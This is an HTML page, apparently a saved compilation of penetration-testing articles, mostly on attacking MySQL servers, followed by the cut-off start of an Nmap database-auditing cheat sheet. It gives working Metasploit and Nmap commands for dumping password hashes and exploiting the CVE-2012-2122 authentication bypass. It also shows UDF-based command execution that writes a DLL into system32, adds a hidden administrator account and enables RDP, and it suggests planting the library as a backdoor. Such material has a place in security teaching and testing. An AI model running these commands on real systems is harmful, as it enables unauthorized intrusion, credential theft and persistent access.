+        <p>Module that displays available users and their hash values
+          in the form convenient for brute force attack:</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a69455150287">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a69455150287-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">p</span><span class="crayon-h"> </span><span class="crayon-cn">3306</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">ip</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-e">script </span><span class="crayon-v">mysql</span><span class="crayon-o">-</span><span class="crayon-v">dump</span><span class="crayon-o">-</span><span class="crayon-i">hashes</span><span class="crayon-h"> </span>–<span class="crayon-e">script </span><span class="crayon-v">args</span><span class="crayon-o">=</span><span class="crayon-s">'username=root,password=secret'</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a69455150287-2"><span class="crayon-v">msf</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-st">use</span><span class="crayon-h"> </span><span class="crayon-v">auxiliary</span><span class="crayon-o">/</span><span class="crayon-v">admin</span><span class="crayon-o">/</span><span class="crayon-v">mysql</span><span class="crayon-o">/</span><span class="crayon-v">mysql</span><span class="crayon-sy">_</span>hashdump
+
+                      </p><p class="crayon-line" id="crayon-5d6aa76ca2a69455150287-3">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>Module that replaces MySQL client and sends queries to a
+          remote database:</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a6c097084066">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a6c097084066-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">p</span><span class="crayon-h"> </span><span class="crayon-cn">3306</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">ip</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-e">script </span><span class="crayon-v">mysql</span><span class="crayon-o">-</span><span class="crayon-v">query</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-v">script</span><span class="crayon-o">-</span><span class="crayon-sy">\</span><span class="crayon-h"> </span><span class="crayon-v">args</span><span class="crayon-o">=</span><span class="crayon-s">'query="&amp;lt;query&amp;gt;"[,username=&amp;lt;username&amp;gt;,password=&amp;lt;password&amp;gt;]'</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a6c097084066-2"><span class="crayon-v">msf</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-st">use</span><span class="crayon-h"> </span><span class="crayon-v">auxiliary</span><span class="crayon-o">/</span><span class="crayon-v">admin</span><span class="crayon-o">/</span><span class="crayon-v">mysql</span><span class="crayon-o">/</span><span class="crayon-v">mysql</span><span class="crayon-sy">_</span>sql
+
+                      </p><p class="crayon-line" id="crayon-5d6aa76ca2a6c097084066-3">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>
+
+        </p><h1 id="scanning-for-cve-2012-2122">Scanning for CVE-2012-2122</h1>
+
+        <p>Separately, it is necessary to mention an interesting
+          module available both in Metasploit and Nmap, and this is a
+          module used to check for [CVE-2012-2122] (goo.gl/hPTqem).
+          This vulnerability allows remote users to bypass
+          authentication due to improper checking of returned values.
+          There is a 1/256 probability of passing the authorization
+          with invalid password, because MySQL believes that the token
+          received from the user and the expected value are equal. By
+          using a known user name (such as, ‘root’, which is virtually
+          always the case) with any password, you can connect to the
+          database by repeating the connection about 300 times. After
+          that, you can damp all user passwords, bruteforce them and
+          connect by using a legitimate password. However, not
+          everything is as good as it seems, this vulnerability affects
+          only assemblies where ‘memcmp()’ function returns the values
+          outside the range between ‘-128’ and ‘127’, which is quite a
+          limited number of systems:
+
+        </p><ul>
+          <li>Ubuntu Linux 64-bit (10.04, 10.10, 11.04, 11.10, 12.04);
+
+          </li><li>OpenSuSE 12.1 64-bit MySQL 5.5.23-log;
+
+          </li><li>Debian Unstable 64-bit 5.5.23-2;
+
+          </li><li>Fedora;
+
+          </li><li>Arch Linux.
+        </li></ul>
+
+        <p>But if there’s even a slightest chance to get into the
+          database, you should try it:</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a6f408319284">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a6f408319284-1"><span class="crayon-v">msf</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-st">use</span><span class="crayon-h"> </span><span class="crayon-v">auxiliary</span><span class="crayon-o">/</span><span class="crayon-v">scanner</span><span class="crayon-o">/</span><span class="crayon-v">mysql</span><span class="crayon-o">/</span><span class="crayon-e">mysql_authbypass_hashdump</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a6f408319284-2"><span class="crayon-e">msf </span><span class="crayon-e">auxiliary</span><span class="crayon-sy">(</span><span class="crayon-v">mysql_authbypass_hashdump</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">set </span><span class="crayon-i">RHOSTS</span><span class="crayon-h"> </span><span class="crayon-cn">172.16.2.54</span>
+
+                      </p><p class="crayon-line" id="crayon-5d6aa76ca2a6f408319284-3"><span class="crayon-e">msf </span><span class="crayon-e">auxiliary</span><span class="crayon-sy">(</span><span class="crayon-v">mysql_authbypass_hashdump</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">set </span><span class="crayon-e">USERNAME </span><span class="crayon-e">root</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a6f408319284-4"><span class="crayon-e">msf </span><span class="crayon-e">auxiliary</span><span class="crayon-sy">(</span><span class="crayon-v">mysql_authbypass_hashdump</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">exploit</span>
+
+                      </p><p class="crayon-line" id="crayon-5d6aa76ca2a6f408319284-5">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>For ‘Nmap’, during the scanning, use the script
+          ‘mysql-vuln-cve2012-2122’:</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a72528330887">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a72528330887-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">sV</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-e">script </span><span class="crayon-v">mysql</span><span class="crayon-o">-</span><span class="crayon-v">vuln</span><span class="crayon-o">-</span><span class="crayon-v">cve2012</span><span class="crayon-o">-</span><span class="crayon-cn">2122</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">target</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a72528330887-2">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>
+
+        </p><h1 id="a-good-old-udf">A Good Old UDF</h1>
+
+        <p>A long, long time ago, when there were still no triggers
+          and stored procedures introduced into MySQL universe, there
+          was support for User-Defined Function. However, even in
+          today’s world, this feature continues to exist and is
+          supported as an external stored function. These functions do
+          not just combine different SQL operators in some specific
+          query, but also greatly extend the functionality of database.
+          Because, unlike Oracle Database, MySQL does not have that
+          coolest Java machine, which can be used to destroy everything
+          in the database. UDF remains one of the few methods available
+          for running commands on the server through the database. In
+          the times of MySQL version 4, this was [Raptor]
+          (goo.gl/0Jj0Uc), an exploit, but it had a number of
+          limitations, including incompatibility with MySQL 5.0 and
+          higher.<br>
+          Currently, there is a legitimate library, which you can
+          download from a legitimate [website] (mysqludf.org). It
+          contains four functions:
+
+        </p><ol>
+          <li>‘sys_eval(arg1)’ executes a random command and returns
+            the output of external command.
+
+          </li><li>‘sys_exec(arg1)’ executes a random command and displays
+            the return code.
+
+          </li><li>‘sys_get(arg1)’ allows you to get an environment
+            variable or ‘NULL’ if there is no environment variable.
+
+          </li><li>‘sys_set(arg1, arg2)’ allows you to set an environment
+            variable (parameters: variable name, value), returns 0 in
+            case of success.
+        </li></ol>
+
+        <p>The library is installed in such path as ‘/usr/lib/mysql’,
+          ‘/usr/lib/mysql/plugin/’ or others depending on the system.
+          Next comes the time to run commands in the database. But
+          first, you need to create the function:</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a75434982665">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a75434982665-1"><span class="crayon-e">CREATE </span><span class="crayon-t">FUNCTION</span><span class="crayon-h"> </span><span class="crayon-e">lib_mysqludf_sys_info </span><span class="crayon-e">RETURNS </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-i">SONAME</span><span class="crayon-h"> </span><span class="crayon-s">'lib_mysqludf_sys.so'</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a75434982665-2"><span class="crayon-e">CREATE </span><span class="crayon-t">FUNCTION</span><span class="crayon-h"> </span><span class="crayon-e">sys_get </span><span class="crayon-e">RETURNS
+                        </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-i">SONAME</span><span class="crayon-h"> </span><span class="crayon-s">'lib_mysqludf_sys.so'</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line" id="crayon-5d6aa76ca2a75434982665-3"><span class="crayon-e">CREATE </span><span class="crayon-t">FUNCTION</span><span class="crayon-h"> </span><span class="crayon-e">sys_set </span><span class="crayon-e">RETURNS
+                        </span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-i">SONAME</span><span class="crayon-h"> </span><span class="crayon-s">'lib_mysqludf_sys.so'</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a75434982665-4"><span class="crayon-e">CREATE </span><span class="crayon-t">FUNCTION</span><span class="crayon-h"> </span><span class="crayon-e">sys_exec </span><span class="crayon-e">RETURNS
+                        </span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-i">SONAME</span><span class="crayon-h"> </span><span class="crayon-s">'lib_mysqludf_sys.so'</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line" id="crayon-5d6aa76ca2a75434982665-5"><span class="crayon-e">CREATE </span><span class="crayon-t">FUNCTION</span><span class="crayon-h"> </span><span class="crayon-e">sys_eval </span><span class="crayon-e">RETURNS
+                        </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-i">SONAME</span><span class="crayon-h"> </span><span class="crayon-s">'lib_mysqludf_sys.so'</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a75434982665-6">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>Now, you can execute it with various commands:</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a78506884112">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a78506884112-1"><span class="crayon-e">select </span><span class="crayon-e">sys_eval</span><span class="crayon-sy">(</span><span class="crayon-s">'whoami'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a78506884112-2">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>To create and delete functions, you must have privileges to
+          ‘INSERT’ or ‘DELETE’. Therefore, you can exploit this bug
+          only if the user to whom you have access has the privilege
+          ‘FILE’ that allows you to read and write files to the server
+          by using such operators as ‘LOAD DATA INFILE’ and ‘SELECT…
+          INTO OUTFILE’. Always check this option, because negligent
+          administrators still do exist. Often, many of them work with
+          database on behalf of the ‘root’. So, even an injection may
+          be enough to get full control over the machine. You can view
+          the privileges in the tables ‘user’, ‘db’, ‘host’, ‘the
+          tables_priv’ and ‘columns_priv’ of ‘mysql’ database. Use ‘set
+          the mysql;’ to change the database, and ‘select * from user;’
+          to output the table.<br>
+          A second condition, the function ‘lib_mysqludf_sys’, is
+          already installed in MySQL. Next, everything is simple, you
+          just create a function and run commands.<br>
+          Another option is to install it on your own as a backdoor on
+          the system. If you need a remote, hidden access to the
+          system, then “pumping” the database by using a legitimate and
+          personal installation of ‘lib_mysqludf_sys’ looks like a good
+          option.
+
+        </p><p>This technique is not new. As everything has already been
+          done before and automated, you will not have to install the
+          function yourself, if you have a Metasploit on hand:</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a7b354962027">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a7b354962027-1"><span class="crayon-st">use</span><span class="crayon-h"> </span><span class="crayon-v">exploit</span><span class="crayon-o">/</span><span class="crayon-v">windows</span><span class="crayon-o">/</span><span class="crayon-v">mysql</span><span class="crayon-o">/</span><span class="crayon-e">mysql_payload</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a7b354962027-2"><span class="crayon-e">msf </span><span class="crayon-e">exploit</span><span class="crayon-sy">(</span><span class="crayon-v">mysql_payload</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">set </span><span class="crayon-e">PASSWORD </span><span class="crayon-i">qwert</span>н
+
+                      </p><p class="crayon-line" id="crayon-5d6aa76ca2a7b354962027-3"><span class="crayon-e">msf </span><span class="crayon-e">exploit</span><span class="crayon-sy">(</span><span class="crayon-v">mysql_payload</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">set </span><span class="crayon-i">RHOST</span><span class="crayon-h"> </span><span class="crayon-cn">172.16.2.54</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a7b354962027-4"><span class="crayon-e">msf </span><span class="crayon-e">exploit</span><span class="crayon-sy">(</span><span class="crayon-v">mysql_payload</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">set </span><span class="crayon-e">USERNAME </span><span class="crayon-e">root</span>
+
+                      </p><p class="crayon-line" id="crayon-5d6aa76ca2a7b354962027-5"><span class="crayon-e">msf </span><span class="crayon-e">exploit</span><span class="crayon-sy">(</span><span class="crayon-v">mysql_payload</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">exploit</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a7b354962027-6">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>‘sqlmap’ can do the same thing. Therefore, if you found an
+          injection, then you can safely put ‘sqlmap’ in charge of the
+          process.
+
+        </p><h1 id="udf-usage-scenario">UDF Usage Scenario</h1>
+
+        <p>One possible scenario to fill the shell/elevate privileges
+          may look as follows. First, you need to gain access to the
+          database (‘root’ user or other with ‘FILE’ privilege) through
+          injection, brute-force attack or otherwise. Next, you have to
+          obtain a copy of UDF library in the attacked machine by
+          taking into account the operating system and its bit depth.
+          You can use the options included in ‘sqlmap’ available [here]
+          (goo.gl/dXNYfi). By the way, this repository also contains
+          the libraries for Windows. You can use various methods to
+          upload the library to the server:
+
+        </p><ul>
+          <li>By using the website functionality for uploading images,
+            files, etc.;
+
+          </li><li>Via open or hacked FTP server.
+        </li></ul>
+
+        <p>The next step is to execute SQL queries in order to load
+          your shell into the table and then retrieve it to the desired
+          folder (‘/usr/lib’ for Linux, ‘c:\windows\system32’ for
+          Windows). Then, create a new function in MySQL. Now, you have
+          a working shell and opportunity to use RCE on the server.
+
+        </p><p>Example for Windows involving the creation of user:</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a7e020447783">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a7e020447783-1"><span class="crayon-v">mysql</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-st">USE</span><span class="crayon-h"> </span><span class="crayon-v">mysql</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a7e020447783-2"><span class="crayon-v">mysql</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">CREATE </span><span class="crayon-e">TABLE </span><span class="crayon-e">bob</span><span class="crayon-sy">(</span><span class="crayon-e">line </span><span class="crayon-v">blob</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line" id="crayon-5d6aa76ca2a7e020447783-3"><span class="crayon-v">mysql</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">INSERT </span><span class="crayon-e">INTO </span><span class="crayon-e">bob </span><span class="crayon-e">values</span><span class="crayon-sy">(</span><span class="crayon-e">load_file</span><span class="crayon-sy">(</span><span class="crayon-s">'C:/xampplite/htdocs/mail/lib_mysqludf_sys.dll'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a7e020447783-4"><span class="crayon-v">mysql</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e ">SELECT *</span><span class="crayon-h"> </span><span class="crayon-e">FROM </span><span class="crayon-v">mysql</span><span class="crayon-sy">.</span><span class="crayon-e">bob </span><span class="crayon-e">INTO </span><span class="crayon-i">DUMPFILE</span><span class="crayon-h"> </span><span class="crayon-s">'c:/windows/system32/lib_mysqludf_sys.dll'</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line" id="crayon-5d6aa76ca2a7e020447783-5"><span class="crayon-v">mysql</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">CREATE </span><span class="crayon-t">FUNCTION</span><span class="crayon-h"> </span><span class="crayon-e">sys_exec </span><span class="crayon-e">RETURNS
+                        </span><span class="crayon-t">integer</span><span class="crayon-h"> </span><span class="crayon-i">SONAME</span><span class="crayon-h"> </span><span class="crayon-s">'lib_mysqludf_sys.dll'</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a7e020447783-6"><span class="crayon-v">mysql</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">SELECT </span><span class="crayon-e">sys_exec</span><span class="crayon-sy">(</span><span class="crayon-s">"net user bob password /add"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line" id="crayon-5d6aa76ca2a7e020447783-7"><span class="crayon-v">mysql</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">SELECT </span><span class="crayon-e">sys_exec</span><span class="crayon-sy">(</span><span class="crayon-s">"net localgroup Administrators bob /add"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a7e020447783-8">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>As an option, you can connect RDP:</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a81518574026">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a81518574026-1"><span class="crayon-e">reg </span><span class="crayon-i">add</span><span class="crayon-h"> </span><span class="crayon-s">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
+                        Server"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">v</span><span class="crayon-h">
+                        </span><span class="crayon-v">fDenyTSConnections</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">t</span><span class="crayon-h">
+                        </span><span class="crayon-v">REG_DWORD</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">d</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">f</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a81518574026-2">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>
+
+        </p><h1 id="conclusion">Conclusion</h1>
+
+        <p>Compared to other DBMS, there are not so many points of
+          entry into someone else’s MySQL database: SQL Injection
+          attacks, finding logins and passwords on GitHub, brute-force
+          attacks, vulnerability to bugs from public domain. The
+          post-exploitation methods can additionally include <a href="http://0.0.0.0:5000/goo.gl/UM5L6R">elevation of privileges</a>, <a href="http://0.0.0.0:5000/goo.gl/q7VDuY">DoS attacks</a>, use of triggers and
+          stored procedures. However, some of them refer to special
+          cases that are rarely encountered or require very specific
+          conditions.
+
+        </p><p>I wanted to show you how quickly and easily you can check
+          the desired database. As you can see, today everything is
+          automated, which allows you to make the desired checks in the
+          background while doing something else. For now, that’s all
+          that I wanted to discuss in this article. And remember — with
+          great strength comes great responsibility :).
+      </p></div>
+    </div>
+
+
+  
+    <hr>
+
+    <h2> <strong> Title: Nmap Cheat Sheet 5: The Final View of a
+      Ninja Pentester </strong></h2>
+
+    <p>Content courtesy of:
+      https://resources.infosecinstitute.com/nmap-cheat-sheet-5-the-final-view-of-a-ninja-pentester/
+
+
+  
+    </p><div>
+      <article class="post-content">
+        <p id="article">
+
+        </p><p>As we discussed in the last topic of our Nmap Series, this
+          will be our final touch for the cheat sheet. Here we will try
+          to cover most of the topic as required for Vulnerability
+          Assessment and Penetration Testing.
+
+        </p><p>As a Ninja Pentester, we will start with following:
+
+        </p><p><strong>Database auditing</strong>
+
+        </p><p>In cases of web applications where storing, editing,
+          updating, and deleting in an information database is used.
+          During pentesting for database we can use Nmap NSE for
+          exploiting and securing the database in a real time scenario.
+          After getting root access, what can we do, or is it possible
+          to attack the database from outside? These questions can be
+          easily answered by the following way.
+
+        </p><p><strong>List of database names:</strong>
+
+        </p><p><strong>nmap -sV –script=mysql-databases
+          192.168.195.130</strong>
+
+        </p><p><img alt="" src="mysql-brute_files/050615_0902_NmapCheatSh1.png">
+
+        </p><p>The above lists the database name in MySQL setup and only
+          works if username and password are null.
+
+        </p><p>Arguments like username and password can be set to find
+          databases for further post exploitation.
+
+        </p><p><strong>nmap -sV –script=mysql-databases –script-args
+          mysqluser=root,mysqlpass=toor 192.168.195.130</strong>
+
+        </p><p><strong>User Auditing:</strong>
+
+        </p><p>The password to use for authentication. If unset it
